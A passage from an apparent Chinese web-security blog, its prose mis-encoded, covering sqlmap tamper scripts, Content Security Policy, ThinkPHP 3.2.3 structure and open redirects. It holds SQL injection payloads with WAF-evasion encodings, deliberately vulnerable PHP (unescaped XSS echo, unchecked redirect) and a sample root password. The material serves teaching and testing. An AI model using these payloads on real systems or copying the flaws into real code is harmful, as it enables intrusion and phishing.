                                        CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code>
                                    </p>
                                    <h4 id="halfversionedmorekeywords-py"><a
                                            href="#halfversionedmorekeywords-py" class="headerlink"
                                            title="halfversionedmorekeywords.py"></a><strong>halfversionedmorekeywords.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL &lt; 5.1<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18/5.0.22<br>ä½œç”¨ï¼šåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlç‰ˆæœ¬æ³¨é‡Š<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&quot;value&#39;
                                        UNION ALL SELECT
                                        CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS
                                        CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND
                                        &#39;QDWa&#39;=&#39;QDWa&quot;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND
                                        &#39;QDWa&#39;=&#39;QDWa</code></p>
                                    <h4 id="space2morehash-py"><a href="#space2morehash-py"
                                                                  class="headerlink"
                                                                  title="space2morehash.py"></a><strong>space2morehash.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL &gt;= 5.1.13<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1.41<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º<code>#</code>ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 9227=9227&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</code>
                                    </p>
                                    <h4 id="apostrophenullencode-py"><a
                                            href="#apostrophenullencode-py" class="headerlink"
                                            title="apostrophenullencode.py"></a><strong>apostrophenullencode.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨éæ³•åŒå­—èŠ‚Unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&quot;1
                                        AND &#39;1&#39;=&#39;1&quot;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 AND
                                        %00%271%00%27=%00%271</code></p>
                                    <h4 id="appendnullbyte-py"><a href="#appendnullbyte-py"
                                                                  class="headerlink"
                                                                  title="appendnullbyte.py"></a><strong>appendnullbyte.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šåœ¨æœ‰æ•ˆè½½è·çš„ç»“æŸä½ç½®åŠ è½½nullå­—èŠ‚å­—ç¬¦ç¼–ç <br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 1=1&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 AND 1=1%00</code></p>
                                    <h4 id="chardoubleencode-py"><a href="#chardoubleencode-py"
                                                                    class="headerlink"
                                                                    title="chardoubleencode.py"></a><strong>chardoubleencode.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                        FIELD FROM%20TABLE&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</code>
                                    </p>
                                    <h4 id="unmagicquotes-py"><a href="#unmagicquotes-py"
                                                                 class="headerlink"
                                                                 title="unmagicquotes.py"></a><strong>unmagicquotes.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ<code>%bf%27</code>å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&quot;1&#39;
                                        AND 1=1&quot;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1%bf%27 AND
                                        1=1--</code></p>
                                    <h4 id="randomcomments-py"><a href="#randomcomments-py"
                                                                  class="headerlink"
                                                                  title="randomcomments.py"></a><strong>randomcomments.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨æ³¨é‡Šç¬¦åˆ†å‰²sqlå…³é”®å­—<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;INSERT&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>I/**/N/**/SERT</code>
                                    </p>
                                    <h1 id="ç¼–å†™tamper"><a href="#ç¼–å†™tamper" class="headerlink"
                                                         title="ç¼–å†™tamper"></a>ç¼–å†™tamper</h1>
                                    <p>é¢å¤–è®°å½•mysql8.0.11ä¿®æ”¹rootå¯†ç </p>
                                    <figure class="highlight plain">
                                        <table>
                                            <tr>
                                                <td class="gutter">
                                                    <pre><span class="line">1</span><br></pre>
                                                </td>
                                                <td class="code">
                                                    <pre><span class="line">`ALTER` `user` `&apos;root&apos;``@``&apos;localhost&apos;` `IDENTIFIED ``BY` `&apos;Cliu123#&apos;`</span><br></pre>
                                                </td>
                                            </tr>
                                        </table>
                                    </figure>

                                    <p>æ­¤å¤„æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š</p>
                                    <p>1ã€ä¸éœ€è¦flush privilegesæ¥åˆ·æ–°æƒé™ã€‚</p>
                                    <p>2ã€å¯†ç è¦åŒ…å«å¤§å†™å­—æ¯ï¼Œå°å†™å­—æ¯ï¼Œæ•°å­—ï¼Œç‰¹æ®Šç¬¦å·ã€‚</p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/06/25/cspå†…å®¹å®‰å…¨ç­–ç•¥/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/06/25/cspå†…å®¹å®‰å…¨ç­–ç•¥/"
                                           itemprop="url">cspå†…å®¹å®‰å…¨ç­–ç•¥</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-06-25T00:00:00+08:00">
                2019-06-25
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹
                                    </h1>
                                    <p>
                                        åœ¨webçš„å®‰å…¨æ¨¡å¼ä¸­ï¼Œæœ‰ä¸€ä¸ªè‘—åçš„ç­–ç•¥â€”åŒæºç­–ç•¥ï¼ŒWebæ˜¯æ„å»ºåœ¨åŒæºç­–ç•¥åŸºç¡€ä¹‹ä¸Šçš„ï¼ŒåŒæºç­–ç•¥æ˜¯æµè§ˆå™¨çš„è¡Œä¸ºï¼Œæ˜¯ä¸ºäº†ä¿æŠ¤æœ¬åœ°æ•°æ®ä¸è¢«JavaScriptä»£ç è·å–å›æ¥çš„æ•°æ®æ±¡æŸ“ï¼Œå› æ­¤æ‹¦æˆªçš„æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚å›æ¥çš„æ•°æ®æ¥æ”¶ï¼Œå³è¯·æ±‚å‘é€äº†ï¼ŒæœåŠ¡å™¨å“åº”äº†ï¼Œä½†æ˜¯æ— æ³•è¢«æµè§ˆå™¨æ¥æ”¶ã€‚</p>
                                    <p>è€ŒXSSè·¨ç«™è„šæœ¬æ”»å‡»åˆ™å¯ä»¥ç»•è¿‡åŒæºç­–ç•¥æ¥è¿›è¡Œæ¶æ„æ”»å‡»ï¼Œæ­¤æ—¶å°±æœ‰ä¸€ä¸ªæ–°çš„é˜²å¾¡â€”å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆcspï¼‰ã€‚</p>
                                    <p>
                                        cspæ˜¯é‡‡ç”¨ç™½åå•åˆ¶åº¦ï¼Œæ˜ç¡®è§„å®šå“ªäº›åŸŸèµ„æºå¯ä»¥åŠ è½½æˆ–è€…æ‰§è¡Œï¼Œå³ä½¿å­˜åœ¨XSSæ¼æ´ï¼Œä¹Ÿæ— æ³•æ‰§è¡Œï¼Œå°±è¿æœ€åŸºç¡€çš„å¼¹çª—ä¹Ÿæ— æ³•å®ç°ï¼Œé™¤éæ§åˆ¶äº†ç™½åå•çš„åŸŸä¸»æœºã€‚</p>
                                    <h1 id="ä»£ç æµ‹è¯•"><a href="#ä»£ç æµ‹è¯•" class="headerlink"
                                                     title="ä»£ç æµ‹è¯•"></a>ä»£ç æµ‹è¯•</h1>
                                    <p>ä¸€ä¸ªä¾‹å­å°±å¾ˆå¥½ç†è§£ã€‚</p>
                                    <h2 id="æ— é˜²æŠ¤"><a href="#æ— é˜²æŠ¤" class="headerlink" title="æ— é˜²æŠ¤"></a>æ— é˜²æŠ¤
                                    </h2>
                                    <pre><code>&lt;html&gt;
&lt;!--
&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; &apos;nonce-123456&apos;;&quot;&gt;
&lt;body&gt;
--&gt;
&lt;?php
echo $_GET[&apos;xss&apos;];
?&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
                                    <p>ä»»æ„XSSä¼ é€’çš„å‚æ•°éƒ½ä¼šè¾“å‡ºå‡ºæ¥ï¼Œæ­¤æ—¶æ³¨é‡Šäº†cspè®¾ç½®ï¼Œæ‰€ä»¥æ˜¯å­˜åœ¨XSSæ¼æ´çš„ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1561383637.jpg" alt>
                                    </p>
                                    <h2 id="CSPé˜²æŠ¤"><a href="#CSPé˜²æŠ¤" class="headerlink"
                                                      title="CSPé˜²æŠ¤"></a>CSPé˜²æŠ¤</h2>
                                    <p>ç„¶åå¢åŠ cspå¤´è®¾ç½®ã€‚</p>
                                    <pre><code>&lt;html&gt;
&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; &apos;nonce-123456&apos;;&quot;&gt;
&lt;body&gt;
&lt;?php
echo $_GET[&apos;xss&apos;];
?&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1561383703.jpg" alt>
                                    </p>
                                    <p>ä¸ä¼šäº§ç”Ÿå¼¹çª—ï¼Œcspåªä¼šåŠ è½½selfèµ„æºï¼Œä»¥åŠnonce-123456æ ‡ç­¾ä¸‹çš„å†…å®¹ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1561383868.jpg" alt>
                                    </p>
                                    <p>åŠ è½½ä¿¡ä»»çš„æ ‡ç­¾ã€‚</p>
                                    <h2 id="é™åˆ¶åŸŸèµ„æºåŠ è½½"><a href="#é™åˆ¶åŸŸèµ„æºåŠ è½½" class="headerlink"
                                                        title="é™åˆ¶åŸŸèµ„æºåŠ è½½"></a>é™åˆ¶åŸŸèµ„æºåŠ è½½</h2>
                                    <pre><code>&lt;html&gt;
&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src http://47.106.185.69; child-src &apos;none&apos;;&quot;&gt;

&lt;body&gt;
&lt;?php
echo $_GET[&apos;xss&apos;];
?&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
                                    <p>è¿™é‡Œé™åˆ¶çš„img-srcåªèƒ½æ¥æ”¶47.106.185.69åŸŸçš„å›¾ç‰‡ã€‚å¦‚æœåŠ è½½å…¶ä»–åŸŸçš„å›¾ç‰‡åˆ™ä¼šè¢«cspæ‹¦æˆªã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1561385014.jpg" alt>
                                    </p>
                                    <p>è€ŒåŠ è½½ç™½åå•ç»™å‡ºçš„åŸŸä¸ä¼šå—æ‹¦æˆª</p>
                                    <p><img src="http://47.106.185.69/1/./img/1561385163.jpg" alt>
                                    </p>
                                    <h1 id="å¸¸ç”¨ç­–ç•¥æŒ‡ä»¤"><a href="#å¸¸ç”¨ç­–ç•¥æŒ‡ä»¤" class="headerlink"
                                                       title="å¸¸ç”¨ç­–ç•¥æŒ‡ä»¤"></a>å¸¸ç”¨ç­–ç•¥æŒ‡ä»¤</h1>
                                    <p>default-src æŒ‡ä»¤å®šä¹‰äº†é‚£äº›æ²¡æœ‰è¢«æ›´ç²¾ç¡®æŒ‡ä»¤æŒ‡å®šçš„å®‰å…¨ç­–ç•¥ã€‚è¿™äº›æŒ‡ä»¤åŒ…æ‹¬ï¼š</p>
                                    <pre><code>child-src
connect-src
font-src
img-src
media-src
object-src
script-src
style-src</code></pre>
                                    <p>script-src</p>
                                    <pre><code>script-srcå®šä¹‰äº†é¡µé¢ä¸­Javascriptçš„æœ‰æ•ˆæ¥æº</code></pre>
                                    <p>style-src</p>
                                    <pre><code>style-srcå®šä¹‰äº†é¡µé¢ä¸­CSSæ ·å¼çš„æœ‰æ•ˆæ¥æº</code></pre>
                                    <p>img-src</p>
                                    <pre><code>img-srcå®šä¹‰äº†é¡µé¢ä¸­å›¾ç‰‡å’Œå›¾æ ‡çš„æœ‰æ•ˆæ¥æº</code></pre>
                                    <p>font-src</p>
                                    <pre><code>font-srcå®šä¹‰äº†å­—ä½“åŠ è½½çš„æœ‰æ•ˆæ¥æº</code></pre>
                                    <p>connect-src</p>
                                    <pre><code>connect-srcå®šä¹‰äº†è¯·æ±‚ã€XMLHttpRequestã€WebSocket å’Œ EventSource çš„è¿æ¥æ¥æºã€‚</code></pre>
                                    <p>child-src</p>
                                    <pre><code>child-src æŒ‡å®šå®šä¹‰äº† web workers ä»¥åŠåµŒå¥—çš„æµè§ˆä¸Šä¸‹æ–‡ï¼ˆå¦‚&lt;frame&gt;å’Œ&lt;iframe&gt;ï¼‰çš„æºã€‚</code></pre>
                                    <p>å–æ¶ˆdefault-srcçš„è®¾ç½®</p>
                                    <pre><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src * &apos;unsafe-inline&apos;; img-src http://47.106.185.69; child-src &apos;none&apos;;&quot;&gt;</code></pre>
                                    <p>åªéœ€è¦å¤šè®¾ç½®ä¸€ä¸ªâ€™unsafe-inlineâ€™ï¼Œå³å¯åŠ è½½ä»»æ„jsä»£ç ã€‚</p>
                                    <h2 id="å¯ç”¨è¿ä¾‹æŠ¥å‘ŠèŠ‚"><a href="#å¯ç”¨è¿ä¾‹æŠ¥å‘ŠèŠ‚" class="headerlink"
                                                        title="å¯ç”¨è¿ä¾‹æŠ¥å‘ŠèŠ‚"></a>å¯ç”¨è¿ä¾‹æŠ¥å‘ŠèŠ‚</h2>
                                    <p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿è§„æŠ¥å‘Šå¹¶ä¸ä¼šå‘é€ã€‚ä¸ºå¯ç”¨å‘é€è¿è§„æŠ¥å‘Šï¼Œä½ éœ€è¦æŒ‡å®š report-uri
                                        ç­–ç•¥æŒ‡ä»¤ï¼Œå¹¶æä¾›è‡³å°‘ä¸€ä¸ªURIåœ°å€å»é€’äº¤æŠ¥å‘Šï¼š</p>
                                    <pre><code>Content-Security-Policy: default-src &apos;self&apos;; report-uri http://reportcollector.example.com/collector.cgi</code></pre>
                                    <p>ç„¶åä½ éœ€è¦è®¾ç½®ä½ çš„æœåŠ¡å™¨èƒ½å¤Ÿæ¥æ”¶æŠ¥å‘Šï¼Œä½¿å…¶èƒ½å¤Ÿä»¥ä½ è®¤ä¸ºæ°å½“çš„æ–¹å¼å­˜å‚¨å¹¶å¤„ç†è¿™äº›æŠ¥å‘Šã€‚</p>
                                    <p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/f1de775bc43e"
                                             target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br>å‚è€ƒï¼š<a
                                            href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP"
                                            target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a>
                                    </p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/05/25/thinkphp3.2.3/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/05/25/thinkphp3.2.3/"
                                           itemprop="url">thinkphpæ¡†æ¶å­¦ä¹ </a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-05-25T00:00:00+08:00">
                2019-05-25
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="tp3-2-3"><a href="#tp3-2-3" class="headerlink"
                                                        title="tp3.2.3"></a>tp3.2.3</h1>
                                    <h2 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink"
                                                     title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2>
                                    <pre><code>www  WEBéƒ¨ç½²ç›®å½•ï¼ˆæˆ–è€…å­ç›®å½•ï¼‰
â”œâ”€index.php       å…¥å£æ–‡ä»¶
â”œâ”€README.md       READMEæ–‡ä»¶
â”œâ”€Application     åº”ç”¨ç›®å½•
â”œâ”€Public          èµ„æºæ–‡ä»¶ç›®å½•
â””â”€ThinkPHP        æ¡†æ¶ç›®å½•</code></pre>
                                    <p>é¦–å…ˆé€šè¿‡è§£æé€šè¿‡å…¥å£æ–‡ä»¶â€”index.phpï¼Œå…¥å£æ–‡ä»¶éå¸¸ç®€çŸ­ã€‚</p>
                                    <pre><code>&lt;?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st &lt;liu21st@gmail.com&gt;
// +----------------------------------------------------------------------

// åº”ç”¨å…¥å£æ–‡ä»¶

// æ£€æµ‹PHPç¯å¢ƒ
if(version_compare(PHP_VERSION,&apos;5.3.0&apos;,&apos;&lt;&apos;))  die(&apos;require PHP &gt; 5.3.0 !&apos;);

// å¼€å¯è°ƒè¯•æ¨¡å¼ å»ºè®®å¼€å‘é˜¶æ®µå¼€å¯ éƒ¨ç½²é˜¶æ®µæ³¨é‡Šæˆ–è€…è®¾ä¸ºfalse
define(&apos;APP_DEBUG&apos;,True);

// å®šä¹‰åº”ç”¨ç›®å½•
define(&apos;APP_PATH&apos;,&apos;./Application/&apos;);

// å¼•å…¥ThinkPHPå…¥å£æ–‡ä»¶
require &apos;./ThinkPHP/ThinkPHP.php&apos;;

// äº²^_^ åé¢ä¸éœ€è¦ä»»ä½•ä»£ç äº† å°±æ˜¯å¦‚æ­¤ç®€å•</code></pre>
                                    <p>
                                        å…ˆæ£€æµ‹PHPç¯å¢ƒï¼Œç„¶åé»˜è®¤å¼€å¯è°ƒè¯•æ¨¡å¼ï¼Œå®šä¹‰APP_PATH,ç„¶ååŒ…å«ThinkPHP/ThinkPHP.phpæ–‡ä»¶ï¼Œé‡ç‚¹é…ç½®åœ¨Thinkphp.phpæ–‡ä»¶é‡Œ</p>
                                    <p>Thinkphp.phpæ¡†æ¶å…¥å£æ–‡ä»¶ã€‚</p>
                                    <pre><code>â”œâ”€ThinkPHP æ¡†æ¶ç³»ç»Ÿç›®å½•ï¼ˆå¯ä»¥éƒ¨ç½²åœ¨éwebç›®å½•ä¸‹é¢ï¼‰
â”‚  â”œâ”€Common       æ ¸å¿ƒå…¬å…±å‡½æ•°ç›®å½•
â”‚  â”œâ”€Conf         æ ¸å¿ƒé…ç½®ç›®å½•
â”‚  â”œâ”€Lang         æ ¸å¿ƒè¯­è¨€åŒ…ç›®å½•
â”‚  â”œâ”€Library      æ¡†æ¶ç±»åº“ç›®å½•
â”‚  â”‚  â”œâ”€Think     æ ¸å¿ƒThinkç±»åº“åŒ…ç›®å½•
â”‚  â”‚  â”œâ”€Behavior  è¡Œä¸ºç±»åº“ç›®å½•
â”‚  â”‚  â”œâ”€Org       Orgç±»åº“åŒ…ç›®å½•
â”‚  â”‚  â”œâ”€Vendor    ç¬¬ä¸‰æ–¹ç±»åº“ç›®å½•
â”‚  â”‚  â”œâ”€ ...      æ›´å¤šç±»åº“ç›®å½•
â”‚  â”œâ”€Mode         æ¡†æ¶åº”ç”¨æ¨¡å¼ç›®å½•
â”‚  â”œâ”€Tpl          ç³»ç»Ÿæ¨¡æ¿ç›®å½•
â”‚  â”œâ”€LICENSE.txt  æ¡†æ¶æˆæƒåè®®æ–‡ä»¶
â”‚  â”œâ”€logo.png     æ¡†æ¶LOGOæ–‡ä»¶
â”‚  â”œâ”€README.txt   æ¡†æ¶READMEæ–‡ä»¶
â”‚  â””â”€ThinkPHP.php    æ¡†æ¶å…¥å£æ–‡ä»¶

defined(&apos;THINK_PATH&apos;)   or define(&apos;THINK_PATH&apos;,     __DIR__.&apos;/&apos;);
defined(&apos;APP_PATH&apos;)     or define(&apos;APP_PATH&apos;,       dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]).&apos;/&apos;);
defined(&apos;APP_STATUS&apos;)   or define(&apos;APP_STATUS&apos;,     &apos;&apos;); // åº”ç”¨çŠ¶æ€ åŠ è½½å¯¹åº”çš„é…ç½®æ–‡ä»¶
defined(&apos;APP_DEBUG&apos;)    or define(&apos;APP_DEBUG&apos;,      false); // æ˜¯å¦è°ƒè¯•æ¨¡å¼</code></pre>
                                    <p>æ£€æŸ¥æ˜¯å¦å®šä¹‰äº†è¿™äº›å˜é‡ï¼Œå¦‚æœæ²¡å®šä¹‰åˆ™å®šä¹‰ã€‚</p>
                                    <p>æœ€åä»£ç åŠ è½½æ ¸å¿ƒç±»ã€‚</p>
                                    <pre><code>// åŠ è½½æ ¸å¿ƒThinkç±»
require CORE_PATH.&apos;Think&apos;.EXT;
// åº”ç”¨åˆå§‹åŒ–
Think\Think::start();

LIB_PATHä¸º å½“å‰ç›®å½•åŠ library,

defined(&apos;LIB_PATH&apos;)     or define(&apos;LIB_PATH&apos;,       realpath(THINK_PATH.&apos;Library&apos;).&apos;/&apos;); // ç³»ç»Ÿæ ¸å¿ƒç±»åº“ç›®å½•

CORE_PATHä¸º

defined(&apos;CORE_PATH&apos;)    or define(&apos;CORE_PATH&apos;,      LIB_PATH.&apos;Think/&apos;); // Thinkç±»åº“ç›®å½•</code></pre>
                                    <p>å‚è€ƒï¼šå®˜æ–¹æ‰‹å†Œ</p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/05/17/urlè·³è½¬å®æˆ˜/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/05/17/urlè·³è½¬å®æˆ˜/"
                                           itemprop="url">æ¸—é€ä¹‹urlè·³è½¬</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-05-17T00:00:00+08:00">
                2019-05-17
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€
                                    </h1>
                                    <p>
                                        æœ€è¿‘åœ¨ä¸€äº›å‚å•†é¡¹ç›®ä¸­å¼€å§‹æ¥è§¦åˆ°ä¸€äº›urlä»»æ„é‡å®šå‘ï¼Œè™½ç„¶æ˜¯ä½å±ï¼Œå¥–é‡‘è¾ƒä½ï¼Œï¼ˆè™½ç„¶å›½å¤–å·²ç»æ˜¯å‡ ç™¾$ï¼‰ä½†æ˜¯ä¸€æ—¦æ‰¾åˆ°çªç ´ç‚¹ï¼Œå‡ ä¹æ•´ä¸ªç«™çš„urlè·³è½¬éƒ½å¯ä»¥bypassï¼Œä¸€ä¸ªå‚å•†æ‰€æœ‰ç‚¹çš„urlè·³è½¬åŠ èµ·æ¥å¥–é‡‘ä¹Ÿæ¯”è¾ƒå¯è§‚ï¼Œæ‰€ä»¥å°†è‡ªå·±æŒ–æ˜è¿‡ç¨‹ä¸­ä¸€ç‚¹ç‚¹å¿ƒå¾—åˆ†äº«ä¸€ä¸‹ã€‚</p>
                                    <h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹
                                    </h1>
                                    <p>
                                        å…ˆèµ°ä¸ªæµç¨‹è¯´äº›åºŸè¯ï¼Œurlé‡å®šå‘æ¼æ´ä¹Ÿç§°urlä»»æ„è·³è½¬æ¼æ´ï¼Œç½‘ç«™ä¿¡ä»»äº†ç”¨æˆ·çš„è¾“å…¥å¯¼è‡´æ¶æ„æ”»å‡»ï¼Œurlé‡å®šå‘ä¸»è¦ç”¨æ¥é’“é±¼ï¼Œæ¯”å¦‚urlè·³è½¬ä¸­æœ€å¸¸è§çš„è·³è½¬åœ¨ç™»é™†å£ï¼Œæ”¯ä»˜å£ï¼Œä¹Ÿå°±æ˜¯ä¸€æ—¦ç™»é™†å°†ä¼šè·³è½¬ä»»æ„è‡ªå·±æ„é€ çš„ç½‘ç«™ï¼Œå¦‚æœè®¾ç½®æˆè‡ªå·±çš„urlåˆ™ä¼šé€ æˆé’“é±¼ï¼Œæµ…æå±å®³ã€‚</p>
                                    <pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;form method=&quot;get&quot; action=&quot;url.php&quot;&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
username:
&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;
&lt;br&gt;&lt;br&gt;
password:
&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;ç™»é™†&quot; name=&quot;password&quot;&gt;
&lt;/form&gt;

&lt;?php

$url=$_GET[&apos;redict&apos;];
echo $_GET[&apos;username&apos;];
if ($_GET[&apos;username&apos;]&amp;&amp;$_GET[&apos;password&apos;]) {

    header(&quot;Location:$url&quot;);exit;
}

?&gt;</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1558097661.jpg" alt>
                                    </p>
                                    <p>
